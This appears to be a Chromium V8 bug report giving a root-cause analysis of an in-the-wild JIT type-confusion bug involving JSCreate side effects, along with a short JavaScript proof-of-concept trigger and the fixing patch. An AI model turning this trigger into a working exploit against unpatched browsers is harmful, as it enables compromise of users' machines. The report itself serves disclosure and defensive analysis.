<b>VULNERABILITY DETAILS</b>

Vulnerability exploited in the wild in targeted attacks, here is the root cause analysis done by saelo@

# Incorrect side effect modelling for JSCreate

The function NodeProperties::InferReceiverMapsUnsafe [1] is responsible for inferring the Map of an object. From the documentation: "This information can be either "reliable", meaning that the object is guaranteed to have one of these maps at runtime, or "unreliable", meaning that the object is guaranteed to have HAD one of these maps.". In the latter case, the caller has to ensure that the object has the correct type, either by using CheckMap nodes or CodeDependencies.

On a high level, the InferReceiverMapsUnsafe function traverses the effect chain until it finds the node creating the object in question and, at the same time, marks the result as unreliable if it encounters a node without the kNoWrite flag [2], indicating that executing the node could have side-effects such as changing the Maps of an object. There is a mistake in the handling of kJSCreate [3]: if the object in question is not the output of kJSCreate, then the loop continues *without* marking the result as unreliable. This is incorrect because kJSCreate can have side-effects, for example by using a Proxy as third argument to Reflect.construct. The bug can then for example be triggered by inlining Array.pop and changing the elements kind from SMIs to Doubles during the unexpected side effect.

## Proof-of-Concept:

ITERATIONS = 10000;
TRIGGER = false;

function f(a, p) {
    return a.pop(Reflect.construct(function() {}, arguments, p));
}

let a;
let p = new Proxy(Object, {
    get: function() {
        if (TRIGGER) {
            a[2] = 1.1;
        }
        return Object.prototype;
    }
});
for (let i = 0; i < ITERATIONS; i++) {
    let isLastIteration = i == ITERATIONS - 1;
    a = [0, 1, 2, 3, 4];
    if (isLastIteration)
        TRIGGER = true;
    print(f(a, p));
}

## Patch

diff --git a/src/compiler/node-properties.cc b/src/compiler/node-properties.cc
index 7ba3a59f6f..4729323c8f 100644
--- a/src/compiler/node-properties.cc
+++ b/src/compiler/node-properties.cc
@@ -447,6 +447,8 @@ NodeProperties::InferReceiverMapsResult NodeProperties::InferReceiverMapsUnsafe(
           }
           // We reached the allocation of the {receiver}.
           return kNoReceiverMaps;
+        } else {
+            result = kUnreliableReceiverMaps;
         }
         break;
       }

## References

[1] https://source.chromium.org/chromium/chromium/src/+/master:v8/src/compiler/node-properties.cc;drc=04ea8adc20fdf4e6dba9885781d415dcf851b153;bpv=1;bpt=1;l=337?originalUrl=https:%2F%2Fcs.chromium.org%2F
[2] https://source.chromium.org/chromium/chromium/src/+/master:v8/src/compiler/node-properties.cc;l=458;drc=04ea8adc20fdf4e6dba9885781d415dcf851b153;bpv=1;bpt=1?originalUrl=https:%2F%2Fcs.chromium.org%2F
[3] https://source.chromium.org/chromium/chromium/src/+/master:v8/src/compiler/node-properties.cc;l=379;drc=04ea8adc20fdf4e6dba9885781d415dcf851b153;bpv=1;bpt=1?originalUrl=https:%2F%2Fcs.chromium.org%2F

<b>VERSION</b>
Chrome Version: m80
Operating System: Windows 10

*We have evidence that this bug is being used in the wild in targeted attacks. Therefore, this bug is subject to a 7 day disclosure deadline.*
